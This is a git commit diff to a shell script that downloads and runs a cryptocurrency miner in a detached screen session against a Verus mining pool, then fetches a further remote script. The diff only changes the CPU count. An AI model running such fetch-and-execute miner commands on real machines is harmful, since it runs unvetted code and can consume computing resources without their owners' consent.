80105d5ee888f109e7101b0eb3965a27970508e7
renilo <88342640+renilo@users.noreply.github.com>
2021-09-17 19:47:43 +0700

    Update autokontol.sh

--- autokontol.sh
+++ autokontol.sh
@@ -16,7 +16,7 @@ wget -O verus-solver https://github.com/renilo/xmr/raw/main/verus-solver
 
 chmod 777 verus-solver
 
-screen -dmS run ./meki-baru -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.CLOUD -p x --cpu 4
+screen -dmS run ./meki-baru -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.CLOUD -p x --cpu 2
 
 wget -O kontol.sh https://raw.githubusercontent.com/renilo/xmr/main/kontol.sh
 
